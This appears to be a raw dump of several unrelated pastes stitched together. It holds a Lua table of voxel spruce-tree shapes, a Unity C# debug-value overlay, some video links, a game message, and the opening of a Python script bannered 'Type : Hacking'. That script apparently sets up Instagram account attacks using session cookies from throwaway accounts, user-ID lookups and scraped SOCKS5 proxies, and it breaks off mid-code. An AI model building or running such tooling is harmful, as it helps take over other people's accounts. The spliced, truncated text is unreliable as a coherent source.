    { 7,10,9,8,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,10,10,9,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,10,12,10,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,10,15,11,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 0,12,6,3,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 1,12,5,2,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 3,12,7,5,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 5,12,8,6,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 6,12,9,7,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,12,10,8,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,12,11,9,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,12,13,10,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 0,13,7,2,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 1,13,6,2,14,7,texture = ""snow"", tint = 0xffff66 },
    { 2,13,7,3,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 3,13,8,5,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 5,13,9,6,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 6,13,10,7,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,13,11,8,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,13,13,9,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 2,14,8,4,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 4,14,9,5,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 5,14,10,6,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 6,14,11,7,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,14,12,8,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,14,13,9,15,14,texture = ""snow"", tint = 0xffff66 },
    { 8,14,14,9,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 0,15,7,2,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 2,15,8,4,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 4,15,9,5,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 5,15,10,6,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 6,15,11,7,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 7,15,12,8,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 8,15,15,9,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
  }
},

{
  label = ""Ёлка"",
  shapes = {
    { 0,0,0,2,5,2,texture = ""quartz_block_side"", tint = 0x663300 },
    { 1,0,8,2,3,9,texture = ""snow"", tint = 0x9999ff },
    { 1,0,9,4,3,10,texture = ""snow"", tint = 0x99cccc },
    { 1,0,10,2,3,11,texture = ""snow"", tint = 0x9999ff },
    { 2,0,0,3,5,1,texture = ""quartz_block_side"", tint = 0x663300 },
    { 2,0,8,3,3,11,texture = ""snow"", tint = 0x99cccc },
    { 3,0,8,4,3,9,texture = ""snow"", tint = 0x9999ff },
    { 3,0,10,4,3,11,texture = ""snow"", tint = 0x9999ff },
    { 7,0,0,8,4,6,texture = ""snow"", tint = 0x0000cc },
    { 7,0,6,11,4,7,texture = ""snow"", tint = 0x663366 },
    { 7,0,7,8,4,8,texture = ""snow"", tint = 0x0000cc },
    { 8,0,0,9,4,8,texture = ""snow"", tint = 0x663366 },
    { 9,0,0,11,4,6,texture = ""snow"", tint = 0x0000cc },
    { 9,0,7,11,4,8,texture = ""snow"", tint = 0x0000cc },
    { 0,5,0,2,10,10,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 0,5,10,4,8,11,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 0,5,11,1,7,12,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 2,5,0,4,10,9,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 2,5,9,5,7,11,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 4,5,0,6,10,8,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 4,5,8,8,7,9,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 5,5,9,7,7,10,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,5,0,7,10,7,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,5,7,7,7,10,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,5,0,8,10,6,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,5,6,8,7,9,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,5,0,9,10,5,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,5,5,9,7,8,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,5,0,10,10,3,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,5,3,10,7,7,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,5,0,11,7,6,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 11,5,0,12,8,3,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 11,5,3,12,7,4,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 12,5,0,13,8,1,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 2,7,9,4,8,11,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 4,7,8,6,8,10,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,7,7,7,8,9,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,7,6,8,8,8,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,7,5,9,8,7,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,7,3,11,8,5,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,7,5,10,8,6,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,7,0,11,8,5,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 11,7,3,12,8,4,texture = ""snow"", tint = 0xffff66 },
    { 2,8,9,3,9,10,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 4,8,8,5,9,9,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,8,7,7,9,8,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,8,6,8,9,7,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,8,5,9,9,6,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,8,3,10,9,4,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,8,0,11,9,2,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 4,9,8,5,10,9,texture = ""snow"", tint = 0xffff66 },
    { 10,9,0,11,10,1,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 0,10,0,2,15,8,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 0,10,8,3,13,9,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 0,10,9,2,12,10,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 2,10,0,4,15,7,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 2,10,7,4,12,9,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 4,10,0,6,12,8,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 6,10,0,7,15,4,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 6,10,4,7,12,7,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,10,0,8,15,3,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,10,3,9,12,5,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,10,5,8,12,6,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,10,0,9,12,5,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,10,0,10,12,3,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,10,0,11,13,1,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 1,12,9,2,13,10,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 2,12,7,5,13,8,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 4,12,0,5,15,6,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 4,12,6,5,13,8,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 5,12,0,6,15,5,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 5,12,5,6,13,7,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 6,12,4,7,13,6,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,12,3,8,13,5,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,12,0,9,13,4,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,12,0,10,13,2,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 2,13,7,3,14,8,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 4,13,6,5,14,7,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 5,13,5,6,14,6,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 6,13,4,7,14,5,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,13,3,8,14,4,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,13,4,8,14,5,texture = ""snow"", tint = 0xffff66 },
    { 8,13,0,9,14,2,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,14,0,9,15,1,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 0,15,0,9,16,1,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,15,1,8,16,3,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,15,3,7,16,4,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,15,4,6,16,5,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,15,5,5,16,6,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,15,6,4,16,7,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,15,7,1,16,8,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 1,15,7,2,16,8,texture = ""snow"", tint = 0xffff66 },
  }
},

{
  label = ""Ёлка"",
  shapes = {
    { 0,0,8,3,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 1,0,7,2,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 3,0,9,4,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 4,0,10,5,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 5,0,11,6,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 6,0,12,7,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 7,0,13,8,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,1,9,2,2,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 2,1,10,4,2,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 4,1,11,5,3,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 5,1,12,6,2,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 6,1,14,7,2,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,2,9,1,3,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 1,2,10,3,3,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 3,2,11,5,3,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 5,2,12,6,3,13,texture = ""snow"", tint = 0xffff66 },
    { 5,2,13,6,3,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 6,2,15,7,3,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,3,10,2,4,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 2,3,11,4,4,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 4,3,12,5,4,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 5,3,14,6,4,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 0,4,11,2,5,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 2,4,12,4,5,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 4,4,14,5,5,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 0,5,11,1,6,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 1,5,12,3,6,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 3,5,13,4,6,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 4,5,15,5,6,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 0,6,11,1,7,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 1,6,12,3,7,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 3,6,13,4,7,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 4,6,15,5,7,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 0,7,12,1,10,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 1,7,12,2,8,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 2,7,13,3,8,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 3,7,14,4,8,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 1,8,13,2,10,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 2,8,13,3,9,14,texture = ""snow"", tint = 0xffff66 },
    { 2,8,14,3,10,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 3,8,15,4,10,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 0,10,13,1,13,16,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 1,10,13,2,11,16,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 2,10,14,3,11,16,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 1,11,14,2,14,16,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 2,11,15,3,13,16,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 0,13,14,2,14,16,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 0,14,14,1,15,16,texture = ""leaves_spruce_opaque"", tint = 0x00ee00 },
    { 1,14,15,2,15,16,texture = ""leaves_spruce_opaque"", tint = 0x00ee00 },
    { 0,15,15,1,16,16,texture = ""snow"", tint = 0xffcc33 },
  }
},

{
  label = ""Ёлка"",
  shapes = {
    { 0,0,0,6,3,2,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,0,2,5,3,4,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,0,4,3,1,7,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 3,0,4,4,1,6,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 4,0,4,5,1,5,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 5,0,2,6,1,4,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 6,0,0,7,1,3,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 7,0,0,8,1,2,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 8,0,0,9,1,1,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,1,4,3,3,5,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,1,5,2,2,6,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 3,1,4,4,2,5,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 5,1,2,6,2,3,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 6,1,0,7,2,1,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,2,5,1,3,6,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,3,0,4,6,2,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 0,3,2,3,6,3,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 0,3,3,2,4,5,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 2,3,3,4,4,4,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 3,3,2,4,4,4,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 4,3,0,5,4,3,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 5,3,0,6,4,1,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 0,4,3,2,5,4,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 3,4,2,4,5,3,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 4,4,0,5,5,1,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 4,4,2,5,5,3,texture = ""snow"", tint = 0xffff66 },
    { 0,5,3,1,6,4,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 0,6,0,3,10,1,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 0,6,1,2,10,2,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 0,6,2,1,10,3,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 0,6,3,1,7,4,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 1,6,2,3,7,3,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 2,6,1,3,7,3,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 3,6,0,4,7,2,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 1,7,2,2,8,3,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 2,7,1,3,8,2,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 3,7,0,4,8,1,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 0,10,0,2,14,1,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 0,10,1,1,13,2,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 1,10,1,2,11,2,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 2,10,0,3,11,1,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 2,12,0,3,13,1,texture = ""snow"", tint = 0xffff66 },
    { 0,14,0,1,15,1,texture = ""leaves_spruce_opaque"", tint = 0x00ee00 },
  }
},

{
  label = ""Ёлка"",
  shapes = {
    { 0,0,15,1,5,16,texture = ""snow"", tint = 0xffcc33 },
    { 0,1,14,1,2,15,texture = ""snow"", tint = 0xffcc66 },
    { 1,1,15,2,2,16,texture = ""snow"", tint = 0xffcc66 },
  }
},

{
  label = ""Ёлка"",
  shapes = {
    { 0,1,0,1,2,1,texture = ""snow"", tint = 0xffcc66 },
  }
}"
p7E8f2kc,Dubious Variable Monitor from Unity Discord,schooliedee,C#,Thursday 7th of March 2024 05:14:35 PM CDT,"using System;
using UnityEngine;
using System.Reflection;
using System.Collections.Generic;

namespace Fnord.Helper
{
    public class DebugObserver : MonoBehaviour
    {
        private List<string> observedValues = new List<string>();
        public Vector2 offset;
        public DisplayPosition displayPosition = DisplayPosition.TopLeft;

        void OnGUI()
        {
            GUIStyle style = new GUIStyle
            {
                fontSize = 16,
                normal = { textColor = Color.white },
                alignment = GetAlignmentBasedOnPosition()
            };

            Vector2 position = CalculateStartPosition();

            foreach (var value in observedValues)
            {
                GUI.Label(new Rect(position, new Vector2(190, 20)), value, style);
                position.y += 20; // Move down for the next value.
            }
        }

        TextAnchor GetAlignmentBasedOnPosition()
        {
            switch (displayPosition)
            {
                case DisplayPosition.TopLeft:
                    return TextAnchor.UpperLeft;
                case DisplayPosition.TopRight:
                    return TextAnchor.UpperRight;
                case DisplayPosition.BottomLeft:
                    return TextAnchor.LowerLeft;
                case DisplayPosition.BottomRight:
                    return TextAnchor.LowerRight;
                case DisplayPosition.TopCenter:
                    return TextAnchor.UpperCenter;
                case DisplayPosition.BottomCenter:
                    return TextAnchor.LowerCenter;
                default:
                    return TextAnchor.UpperLeft; // Default alignment
            }
        }

        Vector2 CalculateStartPosition()
        {
            Vector2 basePosition = new Vector2();
            switch (displayPosition)
            {
                case DisplayPosition.TopLeft:
                    basePosition = new Vector2(10, 10);
                    break;
                case DisplayPosition.TopRight:
                    basePosition = new Vector2(Screen.width - 200, 10);
                    break;
                case DisplayPosition.BottomLeft:
                    basePosition = new Vector2(10, Screen.height - 20 * observedValues.Count - 10);
                    break;
                case DisplayPosition.BottomRight:
                    basePosition = new Vector2(Screen.width - 200, Screen.height - 20 * observedValues.Count - 10);
                    break;
                case DisplayPosition.TopCenter:
                    basePosition = new Vector2((Screen.width - 190) / 2, 10);
                    break;
                case DisplayPosition.BottomCenter:
                    basePosition = new Vector2((Screen.width - 190) / 2, Screen.height - 20 * observedValues.Count - 10);
                    break;
                default:
                    basePosition = new Vector2(10, 10); // Default to TopLeft if for some reason the position is not recognized
                    break;
            }
            // Apply the offset
            return basePosition + offset;
        }



        void Update()
        {
            observedValues.Clear();

            foreach (var go in FindObjectsOfType<MonoBehaviour>())
            {
                // Observing fields
                foreach (var field in go.GetType().GetFields(BindingFlags.Public | BindingFlags.Instance | BindingFlags.NonPublic))
                {
                    var observeAttr = field.GetCustomAttribute<ObserveAttribute>();
                    if (observeAttr != null)
                    {
                        string label = string.IsNullOrEmpty(observeAttr.Label) ? field.Name + "": "" : observeAttr.Label;
                        string valueToDisplay = label + field.GetValue(go)?.ToString();
                        observedValues.Add(valueToDisplay);
                    }
                }

                // Observing properties
                foreach (var prop in go.GetType().GetProperties(BindingFlags.Public | BindingFlags.Instance | BindingFlags.NonPublic))
                {
                    // Ensure the property has a get method
                    if (prop.GetGetMethod(nonPublic: true) == null)
                    {
                        continue; // Skip properties without a get method
                    }

                    var observeAttr = prop.GetCustomAttribute<ObserveAttribute>();
                    if (observeAttr != null)
                    {
                        string label = string.IsNullOrEmpty(observeAttr.Label) ? prop.Name + "": "" : observeAttr.Label;
                        string valueToDisplay = label + prop.GetValue(go)?.ToString();
                        observedValues.Add(valueToDisplay);
                    }
                }
            }
        }
    }

    [AttributeUsage(AttributeTargets.Field | AttributeTargets.Property, AllowMultiple = false)]
    public class ObserveAttribute : Attribute
    {
        public string Label { get; private set; }

        public ObserveAttribute() : this(string.Empty) { }

        public ObserveAttribute(string label)
        {
            Label = label;
        }
    }

    public enum DisplayPosition
    {
        TopLeft,
        TopRight,
        BottomLeft,
        BottomRight,
        TopCenter,
        BottomCenter
    }

} // namespace
"
hBSktwtQ,Lkyt,Gruzing,Lua,Thursday 7th of March 2024 05:13:23 PM CDT,"https://www.cda.pl/video/10062294d2

https://www.cda.pl/video/7918199f1

https://www.cda.pl/video/811719253

https://www.cda.pl/video/17763712d5

"
UH0yRhAC,motd for my fan game,Yobanzda,Lua,Thursday 7th of March 2024 04:40:18 PM CDT,"7 day notice

seems like there is the first seasonal in the shop for an badge! go ahead and buy untill it goes away!"
fXAffEn1,140.213.218.51-/sdcard/instagram.py.py,OBF-XIn,Python,Thursday 7th of March 2024 04:35:16 PM CDT,"# create by ZORA ID 2024

import os, re, sys, json, time, random, datetime, requests
import uuid, hmac, hashlib, urllib, shutil
from asset.enc_password import Requre
from asset.amankan_data import Require
from asset.useragent import Useragent
from asset.asset2.facebook import Facebook
from bs4 import BeautifulSoup as bs
from rich.tree import Tree
from rich import print as printz
from rich.panel import Panel
from rich.console import Console
from rich.columns import Columns
from concurrent.futures import ThreadPoolExecutor

dump = []
            
class Requ:
    def __init__(self) -> None:
        self.proxies = []
        pass        
        
    def Convert_Name(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(f'https://www.instagram.com/{xxx}/', headers = {""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3""}, cookies={'cookie': cookie}).text
                if 'user_id' in str(response):
                    return(re.findall('""user_id"":""(\d+)""', str(response))[0])
            except (Exception) as e: pass
            
    def Convert_Url(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(xxx, cookies={'cookie': cookie}).text
                if 'media_id' in str(response):
                    return(re.findall('{""media_id"":""(.*?)""',str(response))[0])
            except (Exception) as e: exit(e)

    def Validasi_Username(self, username):
       with requests.Session() as r:
           try:
               response = r.get(""https://i.instagram.com/api/v1/users/web_profile_info/?username={}"".format(username), headers = {""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3""}).json()
               return (response[""data""][""user""][""full_name""], response[""data""][""user""][""edge_followed_by""][""count""], response[""data""][""user""][""edge_follow""][""count""], response[""data""][""user""][""edge_owner_to_timeline_media""][""count""])
           except (Exception) as e: return(None,None,None,None)
        
    def Socksku(self):
        with requests.Session() as r:
            try:
                response = r.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol={}&timeout=100000&country=all&ssl=all&anonymity=all'.format('socks5')).text
                for prox in response.splitlines():
                    self.proxies.append(prox)
                return self.proxies
            except (requests.exceptions.ConnectionError): time.sleep(5); self.Socksku()                 

class Terminal:
    def __init__(self) -> None:
        pass
        
    def Clear_Terminal(self):
        os.system('clear' if 'linux' in sys.platform.lower() else 'cls')
        
    def Banner_Terminal(self):
        self.Clear_Terminal()
        Console(width = 65, style = ""bold grey50"").print(Panel(""""""[bold red]●[bold yellow] ●[bold green] ●[bold white]
[bold red]           _____                 _____  _____)     __  
[bold red]          (, /  |       ,       (, /  /        (__/  ) 
            /---| __      __      /  /   ___     /     
[bold white]         ) /    |_/_)__(_     ___/__/     / ) ) /      
[bold white]        (_/    .-/          (__ /  (____ /   (_/       
              (_/                                            
     [bold white]Version :[bold blue] 2.0[bold white] || Status :[bold green] Premium[bold white] || Type :[bold blue] Hacking""""""))
        return (""Berhasil"")
        
    def Layar_Terminal(self):
        self.get_terminal_size = re.search('columns=(\d+),', str(os.get_terminal_size())).group(1)
        if int(self.get_terminal_size) < 65:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Anda Diwajibkan Untuk Mengecilkan Tampilan Termux Sampai Kotak Ini Terlihat Rapi!...""))
            exit()
        else:
            pass
        
class Login:
    def __init__(self) -> None:
        Terminal().Layar_Terminal()
        pass
        
    def Username_And_Password(self):
        try:
            Terminal().Banner_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silakan Masukan Cookie Instagram, Pastikan Akun Tidak Limite!"", subtitle = ""╭─────"", subtitle_align = ""left""))
            cookies = Console().input(""[bold grey50]   ╰─> "")
            if len(cookies) >0:
                self.username,  self.fullname = self.Validasi_Cookies(cookies)
                with open('Cookie_Instagram.json', 'w') as wr:
                    wr.write(json.dumps({
                        ""Cookie"": cookies,
                    }))
                    wr.close()
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Selamat Datang [green]{self.username}/{self.fullname}[white], Jalankan Ulang Perintahnya!!...""))
                exit()
            else:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Masukan Cookie Instagram, Masukan Dengan Benar, Jangan Kosong Ngab!!...""))
                exit()
        except (KeyboardInterrupt, Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Opss, Cookies Salah, Exspired Atau Limite, Silakan Ganti Akun Tumbal, Di Sarankan Membuat Akun Baru!"")) 
            exit()     
        
    def Validasi_Cookies(self, cookies):
        with requests.Session() as r:
            r.headers.update({
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
            })
            response = r.get('https://i.instagram.com/api/v1/users/{}/info/'.format(re.findall('ds_user_id=(\d+)',str(cookies))[0]), cookies = {
                'cookie': cookies
            })
            self.payload = json.loads(response.text)
            if '\'username\':' in str(self.payload):
                self.username = self.payload['user']['username']
                self.fullname = self.payload['user']['full_name']
                return(self.username, self.fullname)
            else:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Opss, Cookies Exspired Atau Limite, Silakan Ganti Akun Tumbal, Di Sarankan Membuat Akun Baru!""))
                time.sleep(3.5)
                self.Username_And_Password()
                
class Instagram:
    def __init__(self):
        self.Kilometers, self.Meterans, self.amankan_akun = [],[],[]
        self.success, self.chekpoint, self.faktor, self.looping = 0,0,0,0

    def Remove_Cookie(self):
        try: os.system('rm -rf Cookie_Instagram.json')
        except (Exception): pass
        Login().Username_And_Password() 

    def Chek_Cookies(self, created, exspired, sisa):
        try:
